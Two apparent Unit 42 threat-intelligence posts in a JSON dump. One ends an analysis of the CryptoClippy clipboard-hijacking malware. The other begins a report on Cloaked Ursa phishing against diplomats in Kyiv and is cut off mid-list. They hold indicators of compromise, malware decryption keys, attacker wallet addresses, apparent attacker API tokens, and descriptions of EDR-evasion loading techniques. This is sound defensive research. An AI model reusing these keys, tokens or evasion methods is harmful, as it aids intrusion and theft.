crypto wallet with the actor’s crypto wallet, when it is copied to the clipboard.\nIt also contains functionality to communicate with C2 servers.\nFigure 1 shows the attack diagram for CryptoClippy.\nDelivery via Malvertising We’ve observed this malware campaign leveraging Google Ads and TDS.\nFirst the threat actor used Google Search ads that appeared in search results when users search for “WhatsApp Web.”\nThis allowed them to trick victims into opening and downloading their malicious compressed .zip file.\nAfter being alerted to the issue in early 2022, Google implemented additional protections and the company says its systems have improved at detecting and preventing renewed attack attempts.\nIn addition, threat actors used TDS to filter victims and bots on the malicious landing page.\nThe TDS filters exclude bots and internet crawlers by using various criteria to determine if a client device is a real user and also a Portuguese speaker.\nFirst, the TDS checks if the connecting device is coming from a virtual private network (VPN) IP address.\nUsing a VPN can make it difficult for the attacker to determine the location and characteristics of the victim's device, and can also make it more difficult to deliver malicious content.\nNext, the TDS makes user agent checks.\nThe user agent is a string of text that a web browser sends to a website to identify itself and its capabilities.\nBy checking the user agent of the client device, the TDS determines if the preferred browser language is Portuguese by checking the Accept-Language header.\nThe TDS can also check for other information such as device type, operating system, browser version and geolocation.\nFinally, the TDS follows the Hypertext Transfer Protocol (HTTP) GET header criteria.\nThe HTTP GET header is a request message sent by a web browser to a server to retrieve a resource.\nThe header can contain various information, such as the requested URL, the user agent, the Accept-Language header and the referer header.\nChecking the criteria in the HTTP GET header is another way the TDS can determine if the preferred language for the browser is Portuguese If the TDS determines that the connection does not meet the above criteria, the victim is redirected to a different landing page (shown in Figure 2) and prompted to click on \"Continuar para o WhatsApp Web\" (\"Continue to WhatsApp Web\" in Portuguese).\nThis will redirect to the legitimate WhatsApp Web domain without any further malicious activity, effectively avoiding detection by the victim and security software.\nHowever, if the TDS determines that the connection does meet the above criteria, the victim is redirected to the malicious landing page where they are prompted to download the malicious .zip file (shown in Figures 3 and 4).\nThis site disguises itself as the official WhatsApp Web site, offering WhatsApp Desktop.\nDownloading this file from mydigitalrevival[.]com resulted in the initial infection — WhatsApp.zip (shown in Figure 4).\nOther domains we discovered belonging to this campaign are preflightdesign[.]com and pickconferences[.]com, which had the same content in Portuguese.\nWhen a victim successfully loaded the malicious webpage and downloaded the offered .zip file, it contained a .lnk file, as shown in Figure 5.\nFor more technical details on the .lnk file, please see Infection via LNK File.\nFollowing the execution of the .lnk file, Unit 42 researchers observed the following files downloaded to C:\\Users\\ - Ricoly.bat - Ricoly.ps1 - Two obfuscated encrypted files (ps, sc) - One obfuscated encrypted auxiliary config file (pf) The first PowerShell script loader Ricoly.ps1 is launched and executed by the Ricoly.bat batch file.\nThe Ricoly.ps1 script's purpose is to decrypt the second-stage obfuscated/encrypted script ps.\nMore in-depth information about these loader files can be found in Stage 1 - Loader and Stage 2 - Loader.\nThe functionality of the second stage PowerShell script ps is to act as a reflective PE loader.\nThe ps file will target an encrypted EXE file named sc that is written to the file system.\nThe sc file is reflectively loaded and eventually functions as the main loader for CryptoClippy.\nMain CryptoClippy Executable After the execution of the .lnk file and the two subsequent PowerShell scripts, the CryptoClippy operation consists of an executable loader and the main CryptoClippy executable.\nThe loader for CryptoClippy is a 64-bit EXE file, where the main stealer EXE file is embedded inside of the .data section.\nThe loader uses syscalls and appears to overlap with SysWhispers2 implementation for execution.\nSysWhispers2 is a stealthier implementation for code execution, which is used to bypass inspection of user-mode APIs.\nThis bypass is possible because user-mode APIs are typically used by applications, including introspection by AV/EDR products, through user-mode hooks.\nThe main executable for CryptoClippy is written in C and it is statically compiled with the Transport Layer Security (TLS) library Mbed-TLS.\nThe main feature of the executable includes its own algorithm for name generation (i.e., the file path, mutex and event object).\nFor more in-depth information on this algorithm, see Folder Name and Mutex String Generator.\nThe main executable also makes extensive use of a local auxiliary file called pf, which contains an encrypted certificate.\nCryptoClippy uses its own algorithm to deobfuscate the character lookup table from the auxiliary file to build the plaintext certificate from pointers to values in the lookup table.\nThis threat also uses two different RC4 keys for various string decryption functions.\nThe string decryption routine will use a structure built in memory for the index location into the structure, string offset and string size.\nThese strings are related to object names, domains, crypto wallets and persistence scripts. -\nRC4 Key: 1b43233d5a054808061c190336320e46 - RC4 Key: 4646070B47445451604F291809444703 Crypto Stealing Operation The primary objective of CryptoClippy is to identify crypto wallet strings being copied into the clipboard.\nCryptoClippy sets up user-mode event hooks and uses a callback function to execute replacing Ethereum or bitcoin based wallets copied into the Windows clipboard with hardcoded wallet values owned by the threat actor.\nFor more technical details, please see User-Mode Event Hook Setup.\nFigure 6 illustrates the window capturing the clipboard input.\nBased on the execution flow of the loader, this particular application would normally not be visible.\nThe decompiled view of CryptoClippy’s clipboard function (shown in Figure 7) reveals that the wallet addresses used by the threat actor will be RC4 decrypted to be used later on, in any replacement of crypto wallets that take place.\nCryptoClippy will perform a string check against the data being pushed into the clipboard.\nIt will check for common leading characters associated with Ethereum or bitcoin related wallets.\nThe string copied into the clipboard will be looped through to determine the character count.\nOn line 27 of Figure 7, 25 is subtracted from the total character count and compared to see if it is less than or equal to 9.\nThis string check operation works on bitcoin addresses starting with a 1.\nOtherwise the code path will be skipped, and the string in the clipboard will be checked to see if it starts with either bc1 (related to bitcoin) or 0x (related to Ethereum).\nThe debugging view shown in Figure 8 shows the API GetClipboardData and the return value of the API, which contains the example Ethereum wallet copied.\nOnce the clipboard data is obtained, the string checks noted in the decompiled view above will be performed, looking for specific crypto wallet-like characters used.\nIn Figure 9, an Ethereum wallet was provided as input and was subsequently checked for the starting character value of 0x.\nThe function responsible for manipulating the clipboard will swap out the Ethereum wallet address the user copied and replace it with the wallet address of 0xB49aeae711FBa241f657dA46A998833A6591848b for Ethereum by using the API SetClipboardData.\nA small subset of example wallet addresses were tested.\nTable 1 contains user-supplied values that were copied and then subsequently replaced by the crypto clipping function.\n| Coin | Example Wallet | Replaced Wallet Value | | ETH | 0xdB055877e6c13b6A6B25aBcAA29B393777dD0a73 | 0xB49aeae711FBa241f657dA46A998833A6591848b | | BTC | bc1qa5wkgaew2dkv56kfvj49j0av5nml45x9ek9hz6 | 1MVUhqKLr8eEDazESmxxc4mvu6YTaMudMF | | BTC | 17VZNX1SN5NtKa8UQFxwQbFeFc3iqRYhem | 1MVUhqKLr8eEDazESmxxc4mvu6YTaMudMF | | BTC | 1JqDybm2nWTENrHvMyafbSXXtTk5Uv5QAn | 1MVUhqKLr8eEDazESmxxc4mvu6YTaMudMF | | BTC | 3EktnHQD7RiAE6uzMj2ZifT9YgRrkSgzQX | 1MVUhqKLr8eEDazESmxxc4mvu6YTaMudMF | | BTC | 3279PyBGjZTnu1GNSXamReTj98kiYgZdtW | 1MVUhqKLr8eEDazESmxxc4mvu6YTaMudMF | | BTC | bc1qw508d6qejxtdg4y5r3zarvary0c5xw7kv8f3t4 | 1MVUhqKLr8eEDazESmxxc4mvu6YTaMudMF | | BTC | bc1qa5wkgaew2dkv56kfvj49j0av5nml45x9ek9hz6 | 1MVUhqKLr8eEDazESmxxc4mvu6YTaMudMF | Table 1.\nExamples of copied wallets and the replaced wallets.\nTo maintain access to the victim computer, CryptoClippy obtains persistence by adding Ricoly.lnk to the Startup folder (\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Ricoly.lnk).\nThe Ricoly.lnk would be launched as the user logs in, which would execute the Ricoly.bat script, which would then execute Ricoly.ps1.\nAdditional efforts to maintain access are contained in an RC4-encrypted PowerShell script called Tozzia.ps1.\nThe CryptoClippy payload injected into svchost.exe extracts the Tozzia.bat and Tozzia.ps1 files.\nAlong with two other scripts, the Tozzia.ps1 script contains various capabilities related to registry modifications of terminal services, local account creation, net commands and event log clearing.\nThese three scripts are covered in more depth in Backdoor.\nConclusion The overall proliferation of cryptocurrency-focused malware has been gaining momentum the last few years.\nThe threat actor in this particular instance has implemented the following activities in their campaigns: - Incorporating malvertising - Using TDS - Limiting the scope of targeting - Keying the payloads to the environment - Employing more complex and stealthier techniques to hide the overall functionality of the loader and clipper - Creating custom algorithms for data manipulation These practices highlight an interesting shift, especially in cryptocurrency-targeting malware.\nWe often see two particular methods for the distribution of such threats.\nThey may be pushed using a botnet like with Laplas Clipper and Smokeloader, or there may be an underlying malware-as-a-service (MaaS) element such as with Eternity Clipper.\nProtections and Mitigations Palo Alto Networks customers using Cortex XDR receive protections at the endpoints from the malware techniques described in this blog.\nPalo Alto Networks Next-Generation Firewalls with Advanced URL Filtering and DNS Security identify domains associated with the CryptoClippy campaign as malicious.\nIf you think you may have been compromised or have an urgent matter, get in touch with the Unit 42 Incident Response team or call: - North America Toll-Free: 866.486.4842 (866.4.UNIT42) - EMEA: +31.20.299.3130 - APAC: +65.6983.8730 - Japan: +81.50.1790.0200 Palo Alto Networks has shared these findings, including file samples and indicators of compromise, with our fellow Cyber Threat Alliance (CTA) members.\nCTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors.\nLearn more about the Cyber Threat Alliance.\nAppendix The Appendix to this post contains more in-depth descriptions of the activities of this malware.\nThis section will roughly follow the order of activities as described in the infection diagram in Figure 1.\nInfection via LNK File The .lnk file found within the .zip file that is initially downloaded by victims contains a truncated command, shown in Figure A1.\nDouble-clicking the file will execute an obfuscated command located in the target field of the shortcut responsible for checking into the actor-controlled domain, shown in Figure A3.\nThe .lnk file utilizes a few different character padding methods for obfuscation, which include the following character sets: - ^ - !! - :\n~ Figure A2 shows how this padding is used in the .lnk file.\nThe LNK deobfuscates to the following PowerShell command, which will upload the string uiPX to the attacker-controlled domain tunneldrive[.]com via HTTP protocol (shown in Figure A3).\nIt should be noted that in cases observed by Unit 42 researchers, the infection chain traces to files with the extension .lnk.\nThese files are usually contained in a .zip archive.\nHowever, during pivoting in this campaign, we observed another variation to the infection flow where the initial payload is an .exe file (reported on VirusTotal) that is linked to the previously mentioned domain mydigitalrevival[.]com.\nWhen we examined the .exe file that impersonates WhatsApp Web, we found that once it's executed, it will contact the previously mentioned tunneldrive[.]com domain.\nIt will then drop and execute a .bat file to delete itself.\nThis .bat file (shown in Figure A4) uses an obfuscation that gradually builds up its payload similar to the one detailed in this blog, but with more obfuscation.\nIn addition, this obfuscation type appears to be adopted from Daniel Bohannon’s Invoke-Obfuscation project, which is a technique widely used by Brazilian threat actors.\nStage 1 - Loader The first PowerShell script loader Ricoly.ps1 is launched and executed by the Ricoly.bat batch file.\nThe Ricoly.ps1 script's purpose is to decrypt a dropped second-stage obfuscated/encrypted script ps also residing in C:\\Users\\ The Ricoly.ps1 script utilizes an XOR key that is mostly hardcoded (statically set), while one portion of the XOR key is dynamically derived from the processor ID of the computer.\nThis keys the payload and adds an additional layer of anti-analysis, as shown in Figure A5.\nStage 2 - Loader We used the following CyberChef XOR recipe (also shown in Figure A6) to decrypt the second stage payload: - XOR KEY: b8 55 2e 7c 48 f6 44 ea c1 7c 9e 09 eb b0 f5 f1 23 f4 22 42 02 15 a1 cb ed 69 50 c1 1b 46 bf eb fb ff 00 08 06 ec bc c5 55 c1 de 96 14 3b bb a8 85 59 13 70 0b 28 An encrypted EXE file named sc is written to the file system when it’s downloaded during the first stage mentioned above.\nThis EXE file will then be the target and focus of the second stage ps script.\nThe functionality of the second stage PowerShell script ps is to act as a reflective PE loader.\nIt does so using .NET methods and D/invoke to work with .NET delegates to assist in evasion and dynamic resolving.\nThe ps script will determine if the operating system is 32-bit or 64-bit.\nIt will also determine the API functionality needed from kernel32.dll to act as a reflective loader.\nIt does this by using GetDelegateForFunctionPointer for resolving the needed APIs such as VirtualAlloc and CreateThread.\nThe ps script will then XOR decrypt the payload and invoke the EXE file sc (as shown in Figure A7).\nThe EXE file sc, reflectively loaded into memory, acts as the main loader using syscalls to inject code into another newly created process.\nThe newly created svchost.exe process contains CryptoClippy.\nFolder Name and Mutex String Generator The first few functions of the stealer will first map out the file system to create a folder to be used.\nThis is achieved by using the APIs GetWindowsDirectoryA, GetVolumeInformationA and SHGetFolderPathA. The stealer contains a function that will uniquely create alphanumeric strings.\nThis string generator is used in several locations within the main program.\nIt is first used to create a unique folder name under the AppData path.\nTo do this, a constant value is used as a parameter to the string generator (shown in Figure A8).\nIn this instance, the constant is 0x79FE6D, which will be used within the string generator function and mapped to the format string %08x-%08x.\nThe string-generating function will use the constant value provided to the function and the volume serial number queried from the victim’s system.\nIt will create the following string as an example: 079fe6d-de786dd1 (shown in Figure A9).\nThe algorithm will shuffle the string 079fe6d-de786dd1 by splitting the string by each character.\nThe first operation will be an XOR performed by the first character of the string against the value FFFFFFFF.\nThe resulting operation will then be shifted right by 1 and XORed by the constant 0x82F63B78.\nThe resulting XOR operation will then follow the same set of operations a total of eight times per each character in the 16 character example string 079fe6d-de786dd1.\nThe completion of the algorithm returns the folder name to be added to the AppData directory (shown in Figure A10).\nThe folder name in this instance was 55abf82d and the full path was C:\\Users\\xxx\\AppData\\Roaming\\55abf82d.\nThis will vary based on the constant and volume serial number provided as input to create unique alphanumeric strings.\nMutex The creation of the stealer’s mutex also uses the string generator function with a different constant value (shown in Figure A11) supplied as a parameter.\nIn this instance, the value is 0x24F2D5.\nUser-Mode Event Hook Setup In order for the stealer to facilitate clipping out crypto wallets copied to the clipboard and replacing them with the hardcoded wallets included in the binary, it will start by calling the API SetWinEventHook to set up event hooks for calling the function responsible for interacting with clipboard data when the specific events are triggered. -\nEVENT_OBJECT_FOCUS - EVENT_OBJECT_VALUECHANGE - EVENT_SYSTEM_FOREGROUND The event hooks setup will have a process scope of receiving events from all processes as well as all existing threads, and then skip hooking the owning process responsible for creating the hooks.\nFollowing the setup of event hooks is the creation of a Windows event object (shown in Figure A12).\nIt does this by calling the Windows API CreateEventA, which is used for synchronization, and it will signal to a thread when a particular event has occurred and completed.\nFollowing the Windows object event creation, the stealer will use the API RegisterClassExA. This API is provided a pointer to the WNDCLASSEX structure containing wcbClass and various structure fields.\nAfter this, CreateWindowExA is called, which will create a window with the structure pointed to by the previous API.\nThe important field in this structure for our analysis is the field lpfnWndProc, which points to the malware author’s clipboard function.\nBackdoor During CryptoClippy execution, this threat will decrypt and write the files Tozzia.bat and Tozzia.ps1 to the file system, which are embedded within itself.\nThe batch file Tozzia.bat is executed, which in turn will execute Tozzia.ps1 (shown in Figure A13).\nFigure A14 shows Tozzia.ps1 being written to the file system and executed, providing additional persistence.\nFigure A15 shows Tozzia.ps1 gaining persistence by creating a scheduled task.\nTwo additional scripts, Giddia and Knowledgeprojects, were decrypted following the decryption of the Tozzia script but were not executed or written to the file system.\nCarving the two scripts from memory, Giddia and Knowledgeprojects, reveals a few hundred lines of additional script code.\nThe Giddia script (shown in Figures A16 and A17) contains capabilities for manipulating registry property values related to terminal services, with the goal of weakening them.\nIt also contains capabilities for net commands and local account-related operations.\nThe Knowledgeprojects script (shown in Figures A18 and A19) contains capabilities to use PowerShell for clearing logs.\nHunting Queries You can use the following XQL queries to hunt for the different stages of the infection.\nInjection to svchost.exe | 1 2 3 4 5 | config case_sensitive = false timeframe = 30d | dataset = xdr_data | filter event_type = ENUM.INJECTION and event_sub_type = ENUM.INJECTION_CREATE_REMOTE_THREAD | filter action_remote_process_image_command_line = \"C:\\WINDOWS\\System32\\svchost.exe\" and actor_process_image_name = \"powershell.exe\" | fields _time, agent_hostname, agent_ip_addresses, causality_actor_process_command_line, actor_process_command_line, action_remote_process_image_command_line | Indicators of Compromise | 7db350f9ec3adb2b7f9a3e9e58c69112b5a7e2ed0337a1c4ac55c9a993116f5c | WhatsApp-RKQT.lnk | | 15f9645e5621e87c96aa6c3497dde36ba83ec80d5f8f43c7cd809e8a636444e5 | WhatsApp.\nZip | | 096983764a75f1c0bab73dd2dea8b1e035ec1a03399fab97c71349a26856b759 | Ricoly.bat | | f22683e9d2a6e72b3149ef1f26392a1e080ae5f2f004543f2a45732eb78d1e98 | Ricoly.ps1 | | c6c486800bcc9d935931c2c6fbde031942d288a124a60beb1e5d38949105b2ad | ps.ps1 | | b6ab39b49d7d5752dbdade697a76e96d518b1b2df00c344772782c8f5950361e | sc | | 766d25d37210ddc3f1afa84e597b3acdbf6dfb0917451f4a344ca5e570adb063 | pf | | 7c3e9b05dcd5588c26e07d149af3c897c8879804eff1c3e2616c3dd1fcad65fe | sc_deobfuscated | | c88c98930181b6038a0565d9bc08ece16995ecbb01821eee6c5dd3772db694f8 | sc_embedded_payload | | 32c9ddcc694ee6c5a38456c4c3e1b433840a18e384e59d63a5d825428abf036b | Tozzia.bat | | 9e19b108f786bf33b58a9efb823619c2aab23107780ceae0baa2d8da19475eb2 | Tozzia.ps1 | | 2cff03f9efdaf52626bd1b451d700605dc1ea000c5da56bd0fc59f8f43071040 | cacert.pem | | f00ac1a50c39a4781f8f614205672bc72d55823b39c20bccffa3ba244fa74693 | DSC_IMG0003.exe (Public) | | 5a1ce64e4fa19531a3222554bbe99aa6aeadb639d51b2a308648cb6e0fa55c05 | DSCIM100001.exe (Public) | | 89d7c8c7846068c4f618f80d18944f2fcf47cbebe7390d73c1f16ef0ed48d90b | 89d7c8c7846068c4f618f80d18944f2fcf47cbebe7390d73c1f16ef0ed48d90b.sample (Public) | | 498b55ff3967cabdd175c5ec11ef39a060ebded0f104575f2ef7ecb88fa9e9f1 | 75aa93e997427c55cc1cbe44d271da1971b7fdafcf85dc6cf69491c2e5931f1d.sample (Public) | Infrastructure - tunneldrive[.]com - 104[.]21.7.130:80 - mydigitalrevival[.]com - 172[.]67.160.80:80 - hollygap[.]com - 172[.]67.134.21:443, 104[.]21.5.250:443 - yogasmob[.]com - preflightdesign[.]com - pickconferences[.]com Additional Resources - Pervasive Brazilian Financial Malware Targets Bank Customers in Latin America and Europe – Cybereason - Weird Ways to Run Unmanaged Code in .NET - xpnsec - Emulating Covert Operations - Dynamic Invocation (Avoiding PInvoke & API Hooks) - The Wover - Migrating from P/Invoke to D/Invoke - klezvirus - Offensive P/Invoke: Leveraging the Win32 API from Managed Code - SpecterOps - SysWhispers2 - Github - Investigating a Monero Coin Miner - Triskele Labs Updated April 5, 2023, at 5:34 a.m. PT.","num_sentences":185,"metadata":{"source":"blog","platform":"Unit42","filename":"CryptoClippy"}}
{"id":77,"title":"Diplomats Beware: Cloaked Ursa Phishing With a Twist","publish_date":"2023-04-28","link":"https://unit42.paloaltonetworks.com/cloaked-ursa-phishing/","clean_text":"Executive Summary Russia’s Foreign Intelligence Service hackers, which we call Cloaked Ursa (aka APT29, UAC-0004, Midnight Blizzard/Nobelium, Cozy Bear) are well known for targeting diplomatic missions globally.\nTheir initial access attempts over the past two years have predominantly used phishing lures with a theme of diplomatic operations such as the following: - Notes verbale (semiformal government-to-government diplomatic communications) - Embassies’ operating status updates - Schedules for diplomats - Invitations to embassy events These types of lures are generally sent to individuals who handle this type of embassy correspondence as part of their daily jobs.\nThey are meant to entice targets to open the files on behalf of the organization they work for.\nRecently, Unit 42 researchers observed instances of Cloaked Ursa using lures focusing on the diplomats themselves more than the countries they represent.\nWe have identified Cloaked Ursa targeting diplomatic missions within Ukraine by leveraging something that all recently placed diplomats need – a vehicle.\nWe observed Cloaked Ursa targeting at least 22 of over 80 foreign missions located in Kyiv.\nWhile we don’t have details on their infection success rate, this is a truly astonishing number for a clandestine operation conducted by an advanced persistent threat (APT) that the United States and the United Kingdom publicly attribute to Russia’s Foreign Intelligence Service (SVR).\nOur assessment that Cloaked Ursa is responsible for these lures is based on the following: - Similarities to other known Cloaked Ursa campaigns and targets - Use of known Cloaked Ursa TTPs - Code overlap with other known Cloaked Ursa malware These unconventional lures are designed to entice the recipient to open an attachment based on their own needs and wants instead of as part of their routine duties.\nThe lures themselves are broadly applicable across the diplomatic community and thus are able to be sent and forwarded to a greater number of targets.\nThey’re also more likely to be forwarded to others inside of an organization as well as within the diplomatic community.\nOverall, these factors increase the odds of a successful compromise within targeted organizations.\nWhile not likely to fully supplant diplomatic operations-themed lures, these lures focusing on individuals do provide Cloaked Ursa with new opportunities and a broader range of susceptible potential espionage targets.\nPalo Alto Networks customers receive protections against the types of threats discussed in this article by products including: - Cortex XDR - WildFire - Cloud-Delivered Security Services for the Next-Generation Firewall, including Advanced URL Filtering and DNS Security If you believe you have been compromised, the Unit 42 Incident Response team can provide a personalized response.\n| Related Unit 42 Topics | Russia, Ukraine, phishing | | Cloaked Ursa APT Group AKAs | APT29, UAC-0004, Midnight Blizzard/Nobelium, Cozy Bear | BMW for Sale One of the most recent of these novel campaigns that Unit 42 researchers observed appeared to use the legitimate sale of a BMW to target diplomats in Kyiv, Ukraine, as its jumping off point.\nThe campaign began with an innocuous and legitimate event.\nIn mid-April 2023, a diplomat within the Polish Ministry of Foreign Affairs emailed his legitimate flyer to various embassies advertising the sale of a used BMW 5-series sedan located in Kyiv.\nThe file was titled BMW 5 for sale in Kyiv - 2023.docx.\nThe nature of service for professional diplomats is often one that involves a rotating lifestyle of short- to mid-term assignments at postings around the world.\nUkraine presents newly assigned diplomats with unique challenges, being in an area of armed conflict between Russia and Ukraine.\nHow do you ship personal goods, procure safe accommodations and services, and arrange for reliable personal transportation while in a new country?\nThe sale of a reliable car from a trusted diplomat could be a boon for a recent arrival, which Cloaked Ursa viewed as an opportunity.\nWe assess that Cloaked Ursa likely first collected and observed this legitimate advertising flyer via one of the email’s recipients’ mail servers being compromised, or by some other intelligence operation.\nUpon seeing its value as a generic yet broadly appealing phishing lure, they repurposed it.\nTwo weeks later, on May 4, 2023, Cloaked Ursa emailed their illegitimate version of this flyer to multiple diplomatic missions throughout Kyiv.\nThese illegitimate flyers (shown in Figure 1) use benign Microsoft Word documents of the same name as that sent by the Polish diplomat.\nThe key difference with these illegitimate versions is that if a victim clicks on a link offering “more high quality photos,” a URL shortener service (either t[.]ly or tinyurl[.]com) will redirect them to a legitimate site.\nThis site would have been coopted by Cloaked Ursa, resulting in the download of a malicious payload.\nWhen a victim attempts to view any of the “high quality photos” (shown in Figure 2) in the download, the malware executes silently in the background while the selected image displays on the victim’s screen.\nFigure 3 illustrates the full execution flow.\nThese pictures are actually Windows shortcut files masquerading as PNG image files.\nWe’ve observed two versions of these illegitimate flyers.\nThe only difference between the two is the shortened URL used in each case.\nThe URLs ultimately redirect the victim to the same coopted site (hxxps://resetlocations[.]com/bmw.htm).\nAt the time of this writing, one of the flyer versions (SHA256: 311e9c8cf6d0b295074ffefaa9f277cb1f806343be262c59f88fbdf6fe242517) is detected as malicious by multiple vendors according to VirusTotal, while the other version (SHA256: 8902bd7d085397745e05883f05c08de87623cc15fe630b36ad3d208f01ef0596) is not detected.\nFor a full overview of the malware, please refer to the Appendix.\nOverall, we observed Cloaked Ursa targeting at least 22 of over 80 foreign missions located in Kyiv in this campaign, as shown in Table 1.\nThe actual number targeted is likely higher.\nThis is staggering in scope for what generally are narrowly scoped and clandestine APT operations.\n| Known Embassies in Kyiv Targeted by Cloaked Ursa in BMW Campaign | || | | | Table 1.\nKnown embassy targets of BMW campaign.\nFor the activity we observed, Cloaked Ursa used publicly available embassy email addresses for approximately 80% of the targeted victims.\nThe remaining 20% consisted of unpublished email addresses not found on the surface web.\nThis indicates that attackers likely also used other collected intelligence to generate their victim target list, to ensure they were able to maximize their access to desired networks.\nThe majority of the targeted organizations in this campaign were embassies.\nHowever, we also observed Cloaked Ursa targeting both Turkish Ministry of Trade representatives in Ukraine (via their ticaret[.]gov[.]tr work emails) and their embassy in the BMW campaign.\nWhile there were a handful of emails sent directly to individuals’ work addresses within the campaign, the majority of the targeted emails consisted of general inboxes for the embassy, such as country.embassy@mfa[.]gov[.]xx.\nDespite the thought and detail put into targets for this campaign, at least two of the email addresses contained errors and never reached the intended targets.\nOverall, the use of these group inboxes likely increased the odds of the emails being reviewed and passed on to individuals within the embassies looking for transportation.\nWith a few of the embassies we observed being targeted, this was done via group emails hosted on free online webmail services.\nWhile these services offer some protection, they also outsource a portion of the security provided to targeted organizations and their employees to external entities.\nThe use of free online webmail could have the unintended consequence of increasing a diplomatic organization’s difficulty in observing and understanding the totality of threats targeting it while also increasing its attack surface.\nTurkish Diplomats: Humanitarian Assistance for Earthquake Another of the novel Cloaked Ursa campaigns we observed likely targeted the Turkish Ministry of Foreign Affairs (MFA) earlier in 2023, within a February to March timeframe.\nWhile we were unable to obtain the malicious email lure associated with this campaign, we know that it related to a document that purported to be Turkish MFA guidance on humanitarian assistance pertaining to the Feb. 21, 2023, earthquake in Turkey.\nThe earthquake in late February further ravaged a region already devastated by a massive earthquake two weeks earlier, which ultimately killed more than 50,000 and displaced more than 5.9 million people.\nWe were able to determine this second campaign targeting the MFA based on a PDF (shown in Figure 4) that was contained in a downloaded payload (SHA256: 0dd55a234be8e3e07b0eb19f47abe594295889564ce6a9f6e8cc4d3997018839 – for a full overview of the malware, please refer to the Appendix).\nNot one to let a disaster and the highly sympathetic charge it generates go to waste, Cloaked Ursa likely saw a lure providing MFA guidance on humanitarian support for this tragedy as a way to ensure a high level of interest from their targets – these recipients would feel a patriotic obligation and would understand the MFA’s expectations to support their nation and its victims.\nIn addition, given the timely and momentous nature of the lure, it was almost certainly forwarded by concerned employees to others in their organization who would be interested in the guidance.\nConclusion Diplomatic missions will always be a high-value espionage target.\nSixteen months into the Russian invasion of Ukraine, intelligence surrounding Ukraine and allied diplomatic efforts are almost certainly a high priority for the Russian government.\nAs the above campaigns show, diplomats should appreciate that APTs continually modify their approaches – including through spear phishing – to enhance their effectiveness.\nThey will seize every opportunity to entice victims into compromise.\nUkraine and its allies need to remain extra vigilant to the threat of cyber espionage, to ensure the security and confidentiality of their information.\nRecommendations - Train newly assigned diplomats and employees to a diplomatic mission on the cybersecurity threats for the region prior to their arrival.\nThis training should include the specific tactics, techniques and procedures (TTPs) used by APTs in that region. -\nAlways take extra precautions to observe URL redirection when using URL-shortening services. -\nAlways be cautious of downloads, even from seemingly innocuous or legitimate sites.\nAPTs routinely co-opt legitimate sites or services for malicious purposes. -\nAlways take extra precautions with attachments that require a web browser to open.\nThese types of attachments include the following file extensions: .hta, .htm, .html, .mht, .mhtml, .svg, .xht and .xhtml. -\nAlways verify file extension types to ensure you are opening the type of file you intend to.\nIf the file extension does not match, or if it is attempting to obfuscate its nature, it is very likely malicious. -\nWhen received as an attachment to an email, or when downloaded from a link within an email, always look for hidden files and directories in archives such as those with the extensions .zip, .rar, .7z, .tar and .iso.\nThe presence of hidden files or directories could indicate the archive is malicious. -\nConsider disabling JavaScript as a rule.\nPalo Alto Networks customers receive protections against the types of threats discussed in this article by products including: - Cortex XDR - WildFire - Cloud-Delivered Security Services for the Next-Generation Firewall, including Advanced URL Filtering and DNS Security.\nIf you think you may have been compromised or have an urgent matter, get in touch with the Unit 42 Incident Response team or call: - North America Toll-Free: 866.486.4842 (866.4.UNIT42) - EMEA: +31.20.299.3130 - APAC: +65.6983.8730 - Japan: +81.50.1790.0200 Palo Alto Networks disclosed this activity to Microsoft and Dropbox.\nPalo Alto Networks has shared these findings, including file samples and indicators of compromise, with our fellow Cyber Threat Alliance (CTA) members.\nCTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors.\nLearn more about the Cyber Threat Alliance.\nIndicators of Compromise Samples - 311e9c8cf6d0b295074ffefaa9f277cb1f806343be262c59f88fbdf6fe242517 - 8902bd7d085397745e05883f05c08de87623cc15fe630b36ad3d208f01ef0596 - 47e8f705febc94c832307dbf3e6d9c65164099230f4d438f7fe4851d701b580b - 79a1402bc77aa2702dc5dca660ca0d1bf08a2923e0a1018da70e7d7c31d9417f - 38f8b8036ed2a0b5abb8fbf264ee6fd2b82dcd917f60d9f1d8f18d07c26b1534 - 706112ab72c5d770d89736012d48a78e1f7c643977874396c30908fa36f2fed7 - c62199ef9c2736d15255f5deaa663158a7bb3615ba9262eb67e3f4adada14111 - cd4956e4c1a3f7c8c008c4658bb9eba7169aa874c55c12fc748b0ccfe0f4a59a - 0dd55a234be8e3e07b0eb19f47abe594295889564ce6a9f6e8cc4d3997018839 - 60d96d8d3a09f822ded0a3c84194a5d88ed62a979cbb6378545b45b04353bb37 - 03959c22265d0b85f6c94ee15ad878bb4f2956a2b0047733edbd8fdc86defc48 URLs - hxxp://tinyurl[.]com/ysvxa66c - hxxp://t[.]ly/1IFg - hxxps://resetlocations[.]com/bmw.htm - hxxps://tinyurl[.]com/mrxcjsbs - hxxps://simplesalsamix[.]com/e-yazi.html - hxxps://www.willyminiatures[.]com/e-yazi.html Known Email Senders - dawid.tomaszewski@resetlocations[.]com - ops.rejon4@kazmierz[.]pl BMW Payload: Dropbox and MS Graph API Tokens and Secrets - Teams_test - 840aae0d-cd89-4869-bce1-94222c33035e - M.R3_BL2.-CYZcTMwdTTD5X9lMxE*wscQcrZ56RUoklIvNkUw5pW1kJ9tfqvv1vRT8VgOb8uXtJTPB3E2CKV!pmm4V6DF8TRvo60QFCxMnUAnuv3jJ78TqHMdxPHONUDeI!B4DbLyg6ZjPZzghLXtmTZqzxOfpCUInOnhFJGoiL6kob7hKVhxm2dJQ9whK9zORxKg0FAnmd0tAR9lKJJaIUkVLcQ939EG2EKG9xsVVWwL04kX0092j7r2jo0rQR9Nqe4DuG0cRAMoODktAbTiuIsehkO5bM0ZuHsDuRr6mMoJrpwbqP0nt5PqJ*E7TS2scdYYOxnQ0mQ$$ - iofd62cx8jy9vyp - sx6qt5iw2t9y7r8 - GCy8UdFrumsAAAAAAAAAASYLcT6_Rjx8PYFAvKH3Q3fT27eYzNsXJYCz7320YBIM Turkey MFA Payload: Dropbox and MS Graph API Tokens and Secrets - e0f94357-98c9-475d-94eb-27b6c74a6429 - mytestworkapp1 - 